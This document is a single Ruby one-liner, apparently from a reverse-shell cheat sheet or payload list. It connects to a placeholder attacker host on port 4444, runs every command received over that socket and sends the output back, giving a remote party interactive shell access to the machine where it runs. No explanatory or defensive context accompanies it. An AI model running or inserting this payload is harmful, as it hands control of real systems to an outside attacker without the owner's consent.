ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
